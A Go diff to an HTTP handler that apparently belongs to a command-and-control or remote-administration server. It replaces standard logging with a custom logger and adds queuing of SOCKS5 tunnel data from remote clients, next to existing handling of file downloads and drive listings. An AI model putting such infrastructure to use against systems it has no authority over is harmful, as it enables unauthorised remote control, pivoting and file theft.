@@ -5,11 +5,12 @@ import (
 	"BackendTemplate/pkg/config"
 	"BackendTemplate/pkg/database"
 	"BackendTemplate/pkg/encrypt"
+	"BackendTemplate/pkg/logger"
 	"BackendTemplate/pkg/utils"
 	"encoding/binary"
 	"encoding/json"
+	"fmt"
 	"io"
-	"log"
 	"net/http"
 	"os"
 	"path/filepath"
@@ -74,7 +75,7 @@ func PostHttp(w http.ResponseWriter, r *http.Request) {
 		// 使用通用的安全路径函数
 		fullPath, err := utils.GetSafeFilePath(uid, filePath)
 		if err != nil {
-			log.Printf("Security check failed: %v", err)
+			logger.Error("Security check failed: %v", err)
 			break
 		}
 
@@ -86,20 +87,20 @@ WHERE uid = ? AND file_path = ?;
 `
 		_, err = database.Engine.QueryString(sql, fileLen, 0, uid, filePath)
 		if err != nil {
-			log.Printf("Database update failed: %v", err)
+			logger.Error("Database update failed: %v", err)
 		}
 
 		// 确保下载目录存在
 		downloadDir := filepath.Dir(fullPath)
 		if err := os.MkdirAll(downloadDir, 0755); err != nil {
-			log.Printf("Failed to create download directory: %v", err)
+			logger.Error("Failed to create download directory: %v", err)
 			break
 		}
 
 		// 检查文件是否存在，如果存在则删除
 		if _, err := os.Stat(fullPath); err == nil {
 			if err := os.Remove(fullPath); err != nil {
-				log.Printf("Failed to remove existing file: %v", err)
+				logger.Error("Failed to remove existing file: %v", err)
 				break
 			}
 		}
@@ -107,7 +108,7 @@ WHERE uid = ? AND file_path = ?;
 		// 创建新文件（使用安全路径）
 		fp, err := os.OpenFile(fullPath, os.O_CREATE|os.O_TRUNC|os.O_WRONLY, 0644)
 		if err != nil {
-			log.Printf("Failed to create file: %v", err)
+			logger.Error("Failed to create file: %v", err)
 			break
 		}
 		defer fp.Close()
@@ -120,7 +121,7 @@ WHERE uid = ? AND file_path = ?;
 		// 使用通用的安全路径函数
 		fullPath, err := utils.GetSafeFilePath(uid, filePath)
 		if err != nil {
-			log.Printf("Security check failed: %v", err)
+			logger.Error("Security check failed: %v", err)
 			break
 		}
 
@@ -132,20 +133,20 @@ WHERE uid = ? AND file_path = ?;
 		// 确保下载目录存在
 		downloadDir := filepath.Dir(fullPath)
 		if err := os.MkdirAll(downloadDir, 0755); err != nil {
-			log.Printf("Failed to create download directory: %v", err)
+			logger.Error("Failed to create download directory: %v", err)
 			break
 		}
 
 		// 使用安全路径打开文件
 		fp, err := os.OpenFile(fullPath, os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
 		if err != nil {
-			log.Printf("Failed to open file: %v", err)
+			logger.Error("Failed to open file: %v", err)
 			break
 		}
 		defer fp.Close()
 
 		if _, err := fp.Write(fileContent); err != nil {
-			log.Printf("Failed to write file content: %v", err)
+			logger.Error("Failed to write file content: %v", err)
 		}
 
 	case command.DRIVES:
@@ -156,6 +157,10 @@ WHERE uid = ? AND file_path = ?;
 		filePath := string(data[4 : 4+filePathLen])
 		fileContent := data[4+filePathLen:]
 		command.VarFileContentQueue.Add(uid, filePath, string(fileContent))
+	case command.Socks5Data:
+		md5sign := data[:16]
+		rawData := data[16:]
+		command.VarSocks5Queue.Add(uid, fmt.Sprintf("%x", md5sign), string(rawData))
 	}
 	var pos1, pos2, pos3 []byte
 	pos1, _ = encrypt.EncodeBase64(encrypt.GenRandomBytes())
